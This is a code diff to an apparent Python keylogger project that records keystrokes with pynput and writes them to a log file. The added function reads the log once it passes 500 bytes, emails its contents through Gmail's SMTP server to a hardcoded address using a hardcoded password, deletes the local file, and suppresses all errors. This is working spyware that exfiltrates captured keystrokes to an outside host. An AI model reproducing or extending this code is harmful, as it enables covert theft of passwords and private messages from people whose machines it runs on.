@@ -1,4 +1,10 @@
 from pynput.keyboard import Listener,Key
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import smtplib
+import os
+import time
+
 liste=list()
 cpstatus=False
 shstatus=False
@@ -53,6 +59,30 @@ def bas(key):
     if len(liste) >=30:
         dosya_yaz()
         liste=list()
+
+def mail_gndr():
+    knm="C:/Users/zeyne/OneDrive/Desktop/keylogger/key.txt"
+    try:
+        if os.path.getsize(knm) >=500:
+            with open(knm,"r",encoding="utf-8") as file:
+                 icerik=file.read()
+            yapi=MIMEMultipart()
+            yapi["From"]="zz@gmail.com"
+            yapi["To"]="zz@gmail.com"
+            yapi["Subject"]="LOG"
+
+            yazi= MIMEText(icerik,"plain")
+            yapi.attach(yazi)
+            server=smtplib.SMTP("smtp.gmail.com",587)
+            server.ehlo()
+            server.starttls()
+            server.login("zz@gmail.com","123456789")
+            server.sendmail("zz@gmail.com","zz@gmail.com",yapi.as_string())
+            server.close()
+            os.remove(knm)
+    except:
+        pass
+
 
 def birak(key):
     global shstatus,gr_status
